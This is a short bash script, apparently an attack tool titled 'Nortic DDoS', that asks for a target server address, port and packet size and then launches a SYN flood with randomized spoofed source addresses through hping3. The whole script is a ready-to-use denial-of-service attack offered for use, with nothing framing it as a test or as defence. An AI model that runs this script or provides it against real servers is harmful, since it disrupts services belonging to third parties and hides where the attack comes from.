..c#!/bin/bash
echo """
    _   __           __  __    _         ____  ____       _____
   / | / /___  _____/ /_/ /_  (_)____   / __ \/ __ \____ / ___/
  /  |/ / __ \/ ___/ __/ __ \/ / ___/  / / / / / / / __ \\__ \
 / /|  / /_/ / /  / /_/ / / / / /__   / /_/ / /_/ / /_/ /__/ /
/_/ |_/\____/_/   \__/_/ /_/_/\___/  /_____/_____/\____/____/
                                                               """
echo "Welcome, Enter server address for DDoS"
read ip
echo "Please enter port"
read port
echo "Enter packet size | 0 - 120"
read packet
sudo hping3 $ip -q -n -d $packet -S -p $port --flood --rand-source